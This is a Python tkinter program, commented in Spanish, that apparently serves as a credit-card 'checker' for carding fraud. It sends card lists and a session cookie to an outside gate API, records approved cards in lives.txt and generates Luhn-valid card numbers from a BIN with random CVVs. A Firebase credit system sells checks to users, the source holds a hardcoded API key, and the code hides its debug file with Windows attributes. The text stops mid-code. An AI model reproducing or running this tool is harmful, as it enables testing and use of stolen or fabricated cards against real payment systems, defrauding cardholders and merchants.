import tkinter as tk
from tkinter import ttk, messagebox
import requests
from bs4 import BeautifulSoup
import threading
import queue
from tkinter import font as tkfont
import os
import random
from datetime import datetime
import json
import firebase_admin
from firebase_admin import credentials, db, auth
import pyrebase
import time
import ctypes  # Para ocultar archivos en Windows

# Configuración de Firebase
FIREBASE_CONFIG = {
    "apiKey": "AIzaSyCH0DA0Ptc6s5AG17ho560wO5IeWu88EmQ",
    "authDomain": "checkerb-d4cea.firefirebaseapp.com",
    "databaseURL": "https://checkerbcc-d4cea-default-rtdb.firebaseio.com",
    "projectId": "checkerbcc-d4cea",
    "storageBucket": "checkerbcc-d4cea.firefirebasestorage.app",
    "messagingSenderId": "92848736093",
    "appId": "1:92848736093:web:c0229f4d5e6ed5ed5ed5a3718ab4"
}

# Inicializar Firebase
try:
    # Intenta inicializar la app (puede fallar si ya está inicializada)
    firebase = pyrebase.initialize_app(FIREBASE_CONFIG)
    auth_firebase = firebase.auth()
    db_firebase = firebase.database()
except:
    pass

# Configuración global
API_URL = 'https://lunarcntr.xyz/api.php'
BASE_URL = 'https://lunarcntr.xyz/'
DATA_FILE = 'usuarios.json'

# Colores y estilo
COLOR_FONDO = "#121212"
COLOR_PRIMARIO = "#03DAC6"
COLOR_SECUNDARIO = "#BB86FC"
COLOR_TEXTO = "#FFFFFF"
COLOR_APROBADA = "#00FF7F"
COLOR_RECHAZADA = "#FF5555"
COLOR_BOTON = "#3700B3"
COLOR_BOTON_HOVER = "#6200EE"
COLOR_ENTRY = "#1E1E1E"
COLOR_BOTON_OSCURO = "#050505"
COLOR_ADMIN = "#FFA500"

# Variables de control
pausado = False
lista_tarjetas_actual = []
CREDITOS_POR_TARJETA = 5
usuario_actual = None
usuarios = {}
user_token = None
user_id_actual = None  # Agregamos esta variable para almacenar el ID del usuario actual

# ================== FUNCIONES FIREBASE ==================
def firebase_login(email, password):
    """Autentica al usuario en Firebase"""
    global user_token, user_id_actual
    try:
        user = auth_firebase.sign_in_with_email_and_password(email, password)
        user_token = user['idToken']
        user_id_actual = user['localId']  # Guardamos el ID del usuario
        return user
    except Exception as e:
        error_msg = str(e)
        if "INVALID_EMAIL" in error_msg:
            return "Correo electrónico inválido"
        elif "EMAIL_NOT_FOUND" in error_msg:
            return "Usuario no encontrado"
        elif "INVALID_PASSWORD" in error_msg:
            return "Contraseña incorrecta"
        else:
            return f"Error de autenticación: {error_msg}"

def firebase_register(email, password, username, invite_code=None):
    """Registra un nuevo usuario en Firebase"""
    try:
        # Crear usuario en Authentication
        user = auth_firebase.create_user_with_email_and_password(email, password)
        
        # Crear datos adicionales en Realtime Database
        user_data = {
            "username": username,
            "creditos": 100 if invite_code else 0,
            "es_admin": False,
            "email": email,
            "fecha_registro": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Guardar en la base de datos
        db_firebase.child("users").child(user['localId']).set(user_data, user['idToken'])
        
        return user
    except Exception as e:
        error_msg = str(e)
        if "EMAIL_EXISTS" in error_msg:
            return "El correo electrónico ya está registrado"
        elif "WEAK_PASSWORD" in error_msg:
            return "La contraseña es demasiado débil (mínimo 6 caracteres)"
        else:
            return f"Error de registro: {error_msg}"

def firebase_get_user_data(user_id, token):
    """Obtiene los datos del usuario desde Firebase"""
    try:
        user_data = db_firebase.child("users").child(user_id).get(token).val()
        return user_data
    except Exception as e:
        print(f"Error obteniendo datos de usuario: {e}")
        return None

def firebase_update_credits(user_id, token, new_credits):
    """Actualiza los créditos del usuario en Firebase"""
    try:
        db_firebase.child("users").child(user_id).update({"creditos": new_credits}, token)
        return True
    except Exception as e:
        print(f"Error actualizando créditos: {e}")
        return False

def firebase_get_all_users(token):
    """Obtiene todos los usuarios desde Firebase (solo para admins)"""
    try:
        users = db_firebase.child("users").get(token).val()
        return users or {}
    except Exception as e:
        print(f"Error obteniendo usuarios: {e}")
        return {}

def firebase_make_admin(user_id, token, is_admin):
    """Cambia el estado de admin de un usuario"""
    try:
        db_firebase.child("users").child(user_id).update({"es_admin": is_admin}, token)
        return True
    except Exception as e:
        print(f"Error cambiando estado de admin: {e}")
        return False

# Cargar datos de usuarios desde Firebase al iniciar
try:
    # Esto solo funcionará si hay un token válido (usuario logueado)
    pass
except Exception as e:
    print(f"Error cargando usuarios: {e}")
    usuarios = {'admin@example.com': {'username': 'admin', 'creditos': 1000, 'es_admin': True}}

def guardar_usuarios():
    """Guarda los datos de usuarios en Firebase"""
    # En esta implementación, los datos se guardan directamente en Firebase
    pass

# Cola para mensajes seguros entre hilos
message_queue = queue.Queue()

def mostrar_mensaje_seguro(tipo, mensaje):
    """Muestra mensajes en la interfaz de forma segura"""
    message_queue.put((tipo, mensaje))
    if root:
        root.event_generate('<<MessageQueued>>', when='tail')

def procesar_mensajes(event=None):
    """Procesa los mensajes en cola"""
    while not message_queue.empty():
        tipo, mensaje = message_queue.get()
        if tipo == "mensaje":
            mensaje_label.config(text=mensaje, fg=COLOR_PRIMARIO)
        elif tipo == "error":
            mensaje_label.config(text=mensaje, fg=COLOR_RECHAZADA)
        elif tipo == "aprovada":
            mensaje_aprovada_text.insert("end", f"✓ {mensaje}\n", "live")
            mensaje_aprovada_text.tag_config("live", foreground=COLOR_APROBADA)
            mensaje_aprovada_text.see("end")
        elif tipo == "reprovada":
            mensaje_reprovada_text.insert("end", f"✗ {mensaje}\n", "muerta")
            mensaje_reprovada_text.tag_config("muerta", foreground=COLOR_RECHAZADA)
            mensaje_reprovada_text.see("end")

class HoverButton(tk.Button):
    """Botón con efecto hover personalizado"""
    def __init__(self, master, **kw):
        tk.Button.__init__(self, master=master, **kw)
        self.default_bg = self["bg"]
        self.default_fg = self["fg"]
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)

    def on_enter(self, e):
        self['bg'] = COLOR_BOTON_HOVER

    def on_leave(self, e):
        self['bg'] = self.default_bg

def pausar_verificacion():
    """Pausa la verificación"""
    global pausado
    pausado = True
    btn_pausar.config(state="disabled")
    mostrar_mensaje_seguro("mensaje", "Verificación pausada")

def limpiar_lista():
    """Limpia la lista de tarjetas"""
    entry_lista_cartoes.delete("1.0", "end")
    mostrar_mensaje_seguro("mensaje", "Lista limpiada")

def enviar_datos():
    """Envía los datos a la página web"""
    cookie = entry_cookie.get().strip()
    lista_tarjetas = entry_lista_cartoes.get("1.0", "end-1c").strip()
    
    if not cookie or not lista_tarjetas:
        mostrar_mensaje_seguro("error", "Error: Complete todos los campos")
        return

    try:
        data = {
            'cookie-input-2': cookie,
            'lista_cartoes': lista_tarjetas
        }
        
        response = requests.post(BASE_URL, data=data)
        
        if response.status_code == 200:
            mostrar_mensaje_seguro("mensaje", "CC'S ENVIADAS A GATE, ESTA TODO LISTO PARA INICIAR!")
        else:
            mostrar_mensaje_seguro("error", f"Error al enviar datos: {response.status_code}")
    except Exception as e:
        mostrar_mensaje_seguro("error", f"Error de conexión: {str(e)}")

def actualizar_lista_tarjetas():
    """Actualiza la lista de tarjetas en el widget Text"""
    entry_lista_cartoes.delete("1.0", "end")
    entry_lista_cartoes.insert("1.0", "\n".join(lista_tarjetas_actual))

def iniciar_verificacion():
    """Inicia el proceso de verificación de tarjetas"""
    global lista_tarjetas_actual, pausado
    
    cookie = entry_cookie.get().strip()
    lista_tarjetas_actual = entry_lista_cartoes.get("1.0", "end-1c").strip().splitlines()
    pausado = False
    btn_pausar.config(state="normal")
    
    if not cookie or not lista_tarjetas_actual:
        mostrar_mensaje_seguro("error", "Error: Complete todos los campos")
        return
    
    # Verificar créditos suficientes
    creditos_necesarios = len(lista_tarjetas_actual) * CREDITOS_POR_TARJETA
    if usuarios[usuario_actual]['creditos'] < creditos_necesarios:
        mostrar_mensaje_seguro("error", f"Créditos insuficientes. Necesitas {creditos_necesarios}, tienes {usuarios[usuario_actual]['creditos']}")
        return

    # Mostrar mensaje de inicio
    mostrar_mensaje_seguro("mensaje", "TEST COMENZADO")
    
    # Crear carpeta lives.txt si no existe
    if not os.path.exists("lives.txt"):
        open("lives.txt", "w").close()

    def verificar_tarjetas():
        while lista_tarjetas_actual and not pausado:
            # Verificar que aún hay créditos
            if usuarios[usuario_actual]['creditos'] < CREDITOS_POR_TARJETA:
                mostrar_mensaje_seguro("error", "Créditos insuficientes. Verificación detenida.")
                break
                
            tarjeta = lista_tarjetas_actual[0]
            
            if not tarjeta.strip():
                lista_tarjetas_actual.pop(0)
                continue
                
            try:
                params = {
                    "lista": tarjeta,
                    "token_api": "",
                    "cookie": cookie
                }
                
                response = requests.get(API_URL, params=params)
                response.encoding = 'utf-8'
                
                soup = BeautifulSoup(response.text, 'html.parser')
                html_text = soup.get_text()
                
                if '#Aprovada' in html_text and 'Cartão vinculado com sucesso' in html_text:
                    # Descontar créditos solo por tarjetas aprobadas
                    usuarios[usuario_actual]['creditos'] -= CREDITOS_POR_TARJETA
                    
                    # Actualizar créditos en Firebase
                    if user_id_actual and user_token:
                        nuevos_creditos = usuarios[usuario_actual]['creditos']
                        if not firebase_update_credits(user_id_actual, user_token, nuevos_creditos):
                            mostrar_mensaje_seguro("error", "Error al actualizar créditos en la base de datos")
                    
                    root.after(0, actualizar_interfaz_usuario)
                    
                    mostrar_mensaje_seguro("aprovada", f"Tarjeta válida: {tarjeta} (Créditos: {usuarios[usuario_actual]['creditos']}")
                    # Guardar en archivo lives.txt
                    with open("lives.txt", "a", encoding="utf-8") as f:
                        f.write(f"{tarjeta}\n")
                    # Eliminar tarjeta verificada de la lista
                    lista_tarjetas_actual.pop(0)
                    root.after(0, actualizar_lista_tarjetas)
                elif 'Reprovada' in html_text:
                    mostrar_mensaje_seguro("reprovada", f"Tarjeta rechazada: {tarjeta}")
                    # Guardar en archivo rechazadas.txt
                    with open("rechazadas.txt", "a", encoding="utf-8") as f:
                        f.write(f"{tarjeta}\n")
                    # Eliminar tarjeta verificada de la lista
                    lista_tarjetas_actual.pop(0)
                    root.after(0, actualizar_lista_tarjetas)
                else:
                    mostrar_mensaje_seguro("error", f"No se pudo verificar: {tarjeta}")
                    # Guardar respuesta para depuración (ocultando el archivo)
                    with open("respuesta_debug.html", "w", encoding="utf-8") as f:
                        f.write(soup.prettify())
                    
                    # Ocultar el archivo debug en Windows
                    try:
                        # 1. Establecer atributo oculto
                        ctypes.windll.kernel32.SetFileAttributesW("respuesta_debug.html", 2)  # FILE_ATTRIBUTE_HIDDEN
                        
                        # 2. Establecer atributo de sistema (más difícil de ver)
                        ctypes.windll.kernel32.SetFileAttributesW("respuesta_debug.html", 4)  # FILE_ATTRIBUTE_SYSTEM
                        
                        # 3. Combinar ambos (oculto + sistema)
                        ctypes.windll.kernel32.SetFileAttributesW("respuesta_debug.html", 6)  # 2 + 4
                    except:
                        pass
                
            except requests.exceptions.RequestException as e:
                # Error de conexión o cookie inválida - NO eliminar la tarjeta
                mostrar_mensaje_seguro("error", f"Error de conexión/cookie con tarjeta {tarjeta}: {str(e)}")
            except Exception as e:
                mostrar_mensaje_seguro("error", f"Error verificando tarjeta {tarjeta}: {str(e)}")
                # NO eliminar la tarjeta de la lista si hay error
        
        if not pausado:
            mostrar_mensaje_seguro("mensaje", "TEST TERMINADO")
            btn_pausar.config(state="disabled")
            guardar_usuarios()
    
    # Ejecutar en un hilo separado para no bloquear la interfaz
    threading.Thread(target=verificar_tarjetas, daemon=True).start()

# ============= SISTEMA DE USUARIOS Y CRÉDITOS =============
def abrir_login():
    """Abre la ventana de login"""
    login = tk.Toplevel(root)
    login.title("Iniciar Sesión")
    login.geometry("400x350")
    login.resizable(False, False)
    login.configure(bg=COLOR_FONDO)
    login.transient(root)
    login.grab_set()
    
    # Título
    tk.Label(login, 
            text="Iniciar Sesión", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=20)
    
    # Frame principal
    frame_principal = tk.Frame(login, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=10)
    
    # Email
    tk.Label(frame_principal, 
            text="Email:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    entry_email = tk.Entry(frame_principal, 
                         width=25, 
                         font=custom_font,
                         bg=COLOR_ENTRY, 
                         fg=COLOR_TEXTO,
                         insertbackground=COLOR_TEXTO)
    entry_email.pack(fill='x', pady=5)
    
    # Contraseña
    tk.Label(frame_principal, 
            text="Contraseña:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    entry_password = tk.Entry(frame_principal, 
                            width=25, 
                            font=custom_font,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO,
                            show="*")
    entry_password.pack(fill='x', pady=5)
    
    # Mensaje de error
    mensaje_error = tk.Label(frame_principal, 
                           text="", 
                           font=custom_font,
                           fg=COLOR_RECHAZADA, 
                           bg=COLOR_FONDO)
    mensaje_error.pack(pady=5)
    
    def iniciar_sesion():
        """Verifica las credenciales y inicia sesión"""
        global usuario_actual, user_token, user_id_actual
        
        email = entry_email.get().strip()
        password = entry_password.get().strip()
        
        if not email or not password:
            mensaje_error.config(text="Ingrese email y contraseña")
            return
        
        # Verificar credenciales con Firebase
        result = firebase_login(email, password)
        
        if isinstance(result, str):
            # Hubo un error
            mensaje_error.config(text=result)
        else:
            # Login exitoso
            user = result
            user_token = user['idToken']
            user_id_actual = user['localId']  # Guardamos el ID del usuario
            
            # Obtener datos adicionales del usuario
            user_data = firebase_get_user_data(user['localId'], user_token)
            
            if user_data:
                usuario_actual = user_data['username']
                usuarios[usuario_actual] = {
                    'creditos': user_data['creditos'],
                    'es_admin': user_data.get('es_admin', False),
                    'email': email,
                    'user_id': user['localId']
                }
                
                actualizar_interfaz_usuario()
                login.destroy()
                mostrar_mensaje_seguro("mensaje", f"Bienvenido {usuario_actual}")
            else:
                mensaje_error.config(text="Error al obtener datos del usuario")
    
    # Botón de login
    btn_login = HoverButton(frame_principal, 
                          text="Iniciar Sesión", 
                          command=iniciar_sesion,
                          bg=COLOR_SECUNDARIO, 
                          fg=COLOR_FONDO,
                          activebackground="#9C64FF",
                          activeforeground=COLOR_FONDO,
                          relief='flat',
                          font=custom_font_bold,
                          padx=15,
                          pady=5)
    btn_login.pack(pady=15)
    
    # Botón de registro
    btn_registro = HoverButton(frame_principal, 
                             text="Registrar Nuevo Usuario", 
                             command=lambda: abrir_registro(login),
                             bg=COLOR_BOTON_OSCURO, 
                             fg=COLOR_TEXTO,
                             activebackground="#333333",
                             activeforeground=COLOR_TEXTO,
                             relief='flat',
                             font=custom_font,
                             padx=15,
                             pady=5)
    btn_registro.pack()

def abrir_registro(parent=None):
    """Abre la ventana de registro de nuevos usuarios"""
    registro = tk.Toplevel(parent or root)
    registro.title("Registrar Usuario")
    registro.geometry("400x400")
    registro.resizable(False, False)
    registro.configure(bg=COLOR_FONDO)
    registro.transient(parent or root)
    registro.grab_set()
    
    # Título
    tk.Label(registro, 
            text="Registrar Usuario", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=20)
    
    # Frame principal
    frame_principal = tk.Frame(registro, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=10)
    
    # Campos del formulario
    campos = [
        ("Email:", "entry_email"),
        ("Nombre de Usuario:", "entry_usuario"),
        ("Contraseña:", "entry_password"),
        ("Confirmar Contraseña:", "entry_confirmar"),
        ("Código de Invitación (opcional):", "entry_codigo")
    ]
    
    entries = {}
    for i, (texto, nombre) in enumerate(campos):
        tk.Label(frame_principal, 
                text=texto, 
                font=custom_font, 
                fg=COLOR_TEXTO, 
                bg=COLOR_FONDO).grid(row=i, column=0, sticky='w', pady=(0 if i == 0 else 5))
        
        show = "*" if "contraseña" in texto.lower() else None
        entry = tk.Entry(frame_principal, 
                       width=25, 
                       font=custom_font,
                       bg=COLOR_ENTRY, 
                       fg=COLOR_TEXTO,
                       insertbackground=COLOR_TEXTO,
                       show=show)
        entry.grid(row=i, column=1, sticky='ew', pady=(0 if i == 0 else 5))
        entries[nombre] = entry
    
    # Mensaje de error
    mensaje_error = tk.Label(frame_principal, 
                           text="", 
                           font=custom_font,
                           fg=COLOR_RECHAZADA, 
                           bg=COLOR_FONDO)
    mensaje_error.grid(row=len(campos), column=0, columnspan=2, pady=5)
    
    def registrar_usuario():
        """Registra un nuevo usuario en Firebase"""
        email = entries['entry_email'].get().strip()
        username = entries['entry_usuario'].get().strip()
        password = entries['entry_password'].get().strip()
        confirmar = entries['entry_confirmar'].get().strip()
        codigo = entries['entry_codigo'].get().strip()
        
        # Validaciones
        if not email or not username or not password:
            mensaje_error.config(text="Email, usuario y contraseña son obligatorios")
            return
            
        if password != confirmar:
            mensaje_error.config(text="Las contraseñas no coinciden")
            return
            
        if len(password) < 6:
            mensaje_error.config(text="La contraseña debe tener al menos 6 caracteres")
            return
            
        # Registrar nuevo usuario en Firebase
        result = firebase_register(email, password, username, codigo)
        
        if isinstance(result, str):
            # Hubo un error
            mensaje_error.config(text=result)
        else:
            # Registro exitoso
            mensaje_error.config(text="Usuario registrado con éxito!", fg=COLOR_APROBADA)
            registro.after(2000, registro.destroy)
    
    # Botón de registro
    btn_registrar = HoverButton(frame_principal, 
                              text="Registrar", 
                              command=registrar_usuario,
                              bg=COLOR_SECUNDARIO, 
                              fg=COLOR_FONDO,
                              activebackground="#9C64FF",
                              activeforeground=COLOR_FONDO,
                              relief='flat',
                              font=custom_font_bold,
                              padx=15,
                              pady=5)
    btn_registrar.grid(row=len(campos)+1, column=0, columnspan=2, pady=10)

def abrir_panel_creditos():
    """Abre el panel para cargar créditos"""
    creditos = tk.Toplevel(root)
    creditos.title("Administrar Créditos")
    creditos.geometry("500x400")
    creditos.resizable(False, False)
    creditos.configure(bg=COLOR_FONDO)
    creditos.transient(root)
    creditos.grab_set()
    
    # Título
    tk.Label(creditos, 
            text="Administrar Créditos", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=10)
    
    # Frame principal
    frame_principal = tk.Frame(creditos, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=10)
    
    # Seleccionar usuario
    tk.Label(frame_principal, 
            text="Usuario:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    
    combo_usuarios = ttk.Combobox(frame_principal, 
                                values=list(usuarios.keys()),
                                font=custom_font,
                                state="readonly")
    combo_usuarios.pack(fill='x', pady=5)
    combo_usuarios.set(usuario_actual)
    
    # Mostrar créditos actuales
    label_creditos = tk.Label(frame_principal, 
                            text=f"Créditos actuales: {usuarios[usuario_actual]['creditos'] if usuario_actual else 0}", 
                            font=custom_font, 
                            fg=COLOR_TEXTO, 
                            bg=COLOR_FONDO)
    label_creditos.pack(anchor='w', pady=(10, 0))
    
    # Cantidad a cargar
    tk.Label(frame_principal, 
            text="Cantidad:", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).pack(anchor='w')
    
    entry_cantidad = tk.Entry(frame_principal, 
                            width=10, 
                            font=custom_font,
                            bg=COLOR_ENTRY, 
                            fg=COLOR_TEXTO,
                            insertbackground=COLOR_TEXTO)
    entry_cantidad.pack(fill='x', pady=5)
    
    def actualizar_creditos():
        """Actualiza los créditos del usuario seleccionado"""
        usuario = combo_usuarios.get()
        cantidad = entry_cantidad.get().strip()
        
        if not usuario or not cantidad:
            messagebox.showerror("Error", "Seleccione usuario e ingrese cantidad")
            return
            
        try:
            cantidad = int(cantidad)
            if cantidad <= 0:
                messagebox.showerror("Error", "Ingrese una cantidad positiva")
                return
                
            # Actualizar créditos en Firebase
            user_id = usuarios[usuario].get('user_id')
            if user_id and user_token:
                nuevos_creditos = usuarios[usuario]['creditos'] + cantidad
                if firebase_update_credits(user_id, user_token, nuevos_creditos):
                    usuarios[usuario]['creditos'] = nuevos_creditos
                    label_creditos.config(text=f"Créditos actuales: {usuarios[usuario]['creditos']}")
                    
                    if usuario == usuario_actual:
                        actualizar_interfaz_usuario()
                        
                    messagebox.showinfo("Éxito", f"Se agregaron {cantidad} créditos a {usuario}")
                else:
                    messagebox.showerror("Error", "No se pudo actualizar los créditos en la base de datos")
        except ValueError:
            messagebox.showerror("Error", "Ingrese un número válido")
    
    # Botón de carga
    btn_cargar = HoverButton(frame_principal, 
                           text="Agregar Créditos", 
                           command=actualizar_creditos,
                           bg=COLOR_SECUNDARIO, 
                           fg=COLOR_FONDO,
                           activebackground="#9C64FF",
                           activeforeground=COLOR_FONDO,
                           relief='flat',
                           font=custom_font_bold,
                           padx=15,
                           pady=5)
    btn_cargar.pack(pady=15)
    
    # Solo para administradores: crear código de invitación
    if usuarios[usuario_actual].get('es_admin'):
        btn_codigo = HoverButton(frame_principal, 
                               text="Generar Código Invitación", 
                               command=generar_codigo_invitacion,
                               bg=COLOR_ADMIN, 
                               fg=COLOR_FONDO,
                               activebackground="#FFC04D",
                               activeforeground=COLOR_FONDO,
                               relief='flat',
                               font=custom_font_bold,
                               padx=15,
                               pady=5)
        btn_codigo.pack()

def generar_codigo_invitacion():
    """Genera un código de invitación para nuevos usuarios"""
    codigo = f"INV-{random.randint(1000, 9999)}"
    messagebox.showinfo("Código de Invitación", 
                      f"Código generado:\n\n{codigo}\n\nEste código dará 100 créditos al nuevo usuario")

def actualizar_interfaz_usuario():
    """Actualiza la interfaz según el usuario actual"""
    if usuario_actual:
        etiqueta_usuario.config(text=f"Usuario: {usuario_actual}")
        etiqueta_creditos.config(text=f"Créditos: {usuarios[usuario_actual]['creditos']}")
        
        # Cambiar color según saldo
        if usuarios[usuario_actual]['creditos'] < 10 * CREDITOS_POR_TARJETA:
            etiqueta_creditos.config(fg=COLOR_RECHAZADA)
        else:
            etiqueta_creditos.config(fg=COLOR_APROBADA)
        
        # Mostrar/ocultar botones de admin según el rol
        if usuarios[usuario_actual].get('es_admin'):
            btn_creditos.pack(side='left', padx=5, fill='x', expand=True)
            btn_admin.pack(side='left', padx=5, fill='x', expand=True)
        else:
            btn_creditos.pack_forget()
            btn_admin.pack_forget()
    else:
        etiqueta_usuario.config(text="No autenticado")
        etiqueta_creditos.config(text="Créditos: 0", fg=COLOR_TEXTO)
        btn_creditos.pack_forget()
        btn_admin.pack_forget()

# ============= GENERADOR DE TARJETAS EN VENTANA EMERGENTE =============
def abrir_generador_tarjetas():
    """Abre la ventana emergente del generador de tarjetas"""
    generador = tk.Toplevel(root)
    generador.title("Generador de Tarjetas")
    generador.geometry("500x400")
    generador.resizable(False, False)
    generador.configure(bg=COLOR_FONDO)
    generador.transient(root)
    generador.grab_set()
    
    # Título
    tk.Label(generador, 
            text="Generador de Tarjetas", 
            font=("Segoe UI", 14, "bold"), 
            fg=COLOR_PRIMARIO, 
            bg=COLOR_FONDO).pack(pady=10)
    
    # Frame principal
    frame_principal = tk.Frame(generador, bg=COLOR_FONDO)
    frame_principal.pack(fill='both', expand=True, padx=20, pady=10)
    
    # Frame de entrada de datos
    frame_entrada = tk.Frame(frame_principal, bg=COLOR_FONDO)
    frame_entrada.pack(fill='x', pady=5)
    
    # BIN (6+ dígitos)
    tk.Label(frame_entrada, 
            text="BIN (6+ dígitos):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=0, column=0, sticky='w', padx=(0, 5))
    entry_bin = tk.Entry(frame_entrada, 
                        width=16, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_bin.grid(row=0, column=1, sticky='ew', padx=(0, 10))
    
    # Mes de expiración
    tk.Label(frame_entrada, 
            text="Mes (MM):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=1, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_mes = tk.Entry(frame_entrada, 
                        width=3, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_mes.grid(row=1, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_mes.insert(0, datetime.now().strftime('%m'))
    
    # Año de expiración
    tk.Label(frame_entrada, 
            text="Año (YYYY):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=2, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_ano = tk.Entry(frame_entrada, 
                        width=5, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_ano.grid(row=2, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_ano.insert(0, str(datetime.now().year + 3))
    
    # CVV
    tk.Label(frame_entrada, 
            text="CVV (3 dígitos):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=3, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_cvv = tk.Entry(frame_entrada, 
                        width=4, 
                        font=custom_font,
                        bg=COLOR_ENTRY, 
                        fg=COLOR_TEXTO,
                        insertbackground=COLOR_TEXTO)
    entry_cvv.grid(row=3, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_cvv.insert(0, f"{random.randint(0,999):03d}")
    
    # Cantidad a generar
    tk.Label(frame_entrada, 
            text="Cantidad (1-1000):", 
            font=custom_font, 
            fg=COLOR_TEXTO, 
            bg=COLOR_FONDO).grid(row=4, column=0, sticky='w', padx=(0, 5), pady=(10, 0))
    entry_cantidad = tk.Entry(frame_entrada, 
                             width=5, 
                             font=custom_font,
                             bg=COLOR_ENTRY, 
                             fg=COLOR_TEXTO,
                             insertbackground=COLOR_TEXTO)
    entry_cantidad.grid(row=4, column=1, sticky='w', padx=(0, 10), pady=(10, 0))
    entry_cantidad.insert(0, "1")
    
    # Frame para botones
    frame_botones = tk.Frame(frame_principal, bg=COLOR_FONDO)
    frame_botones.pack(fill='x', pady=10)
    
    def generar_tarjetas():
        """Genera múltiples tarjetas según la cantidad especificada"""
        bin_number = entry_bin.get().strip()
        mes = entry_mes.get().strip()
        ano = entry_ano.get().strip()
        cvv = entry_cvv.get().strip()
        cantidad = entry_cantidad.get().strip()
        
        if not bin_number.isdigit() or len(bin_number) < 6:
            messagebox.showerror("Error", "Ingrese al menos 6 dígitos para el BIN")
            return
        
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            messagebox.showerror("Error", "Mes inválido (1-12)")
            return
            
        if not ano.isdigit() or len(ano) != 4:
            messagebox.showerror("Error", "Año inválido (4 dígitos)")
            return
            
        if not cvv.isdigit() or len(cvv) != 3:
            cvv = f"{random.randint(0,999):03d}"
            entry_cvv.delete(0, 'end')
            entry_cvv.insert(0, cvv)
            
        try:
            cantidad = int(cantidad)
            if cantidad < 1 or cantidad > 1000:
                messagebox.showerror("Error", "Cantidad debe ser entre 1 y 1000")
                return
        except:
            messagebox.showerror("Error", "Cantidad inválida")
            return
        
        # Calcular dígito de verificación (Luhn)
        def luhn_checksum(card_number):
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = 0
            checksum += sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d*2))
            return checksum % 10
        
        def calculate_luhn(partial_card_number):
            check_digit = luhn_checksum(int(partial_card_number) * 10)
            return check_digit if check_digit == 0 else (10 - check_digit)
        
        # Generar tarjetas
        tarjetas_generadas = []
        for _ in range(cantidad):
            # Generar los dígitos aleatorios necesarios (16 - longitud del BIN)
            longitud_aleatoria = 16 - len(bin_number)
            if longitud_aleatoria > 0:
                aleatorio = ''.join([str(random.randint(0, 9)) for _ in range(longitud_aleatoria - 1)])
                partial = bin_number + aleatorio
            else:
                partial = bin_number[:15]
            
            check_digit = calculate_luhn(partial)
            tarjeta = partial + str(check_digit)
            tarjeta_completa = f"{tarjeta}|{mes}|{ano}|{cvv}"
            tarjetas_generadas.append(tarjeta_completa)
        
        # Mostrar resultados
        texto_resultado.delete('1.0', 'end')
        texto_resultado.insert('end', '\n'.join(tarjetas_generadas))
        messagebox.showinfo("Éxito", f"Se generaron {cantidad} tarjetas")
    
    def copiar_tarjetas():
        """Copia las tarjetas generadas al portapapeles"""
        contenido = texto_resultado.get('1.0', 'end-1c')
        if contenido:
            generador.clipboard_clear()
            generador.clipboard_append(contenido)
            messagebox.showinfo("Copiado", "Tarjetas copiadas al portapapeles")
        else:
            messagebox.showerror("Error", "No hay tarjetas para copiar")
    
    def enviar_a_lista():
        """Envía las tarjetas generadas a la lista principal"""
        contenido = texto_resultado.get('1.0', 'end-1c')
        if contenido:
            entry_lista_cartoes.insert('end', f"{contenido}\n")
            messagebox.showinfo("Éxito", "Tarjetas añadidas a la lista")
            generador.destroy()
        else:
            messagebox.showerror("Error", "No hay tarjetas para enviar")
    
    def limpiar_generador():
        """Limpia los campos del generador"""
        entry_bin.delete(0, 'end')
        entry_mes.delete(0, 'end')
        entry_mes.insert(0, datetime.now().strftime('%m'))
        entry_ano.delete(0, 'end')
        entry_ano.insert(0, str(datetime.now().year + 3))
        entry_cvv.delete(0, 'end')
        entry_cvv.insert(0, f"{random.randint(0,999):03d}")
        entry_cantidad.delete(0, 'end')
        entry_cantidad.insert(0, "1")
        texto_resultado.delete('1.0', 'end')
    
    # Botones
    btn_generar = HoverButton(frame_botones, 
                            text="Generar", 
                            command=generar_tarjetas,
                            bg=COLOR_BOTON, 
                            fg=COLOR_TEXTO,
                            activebackground=COLOR_BOTON_HOVER,
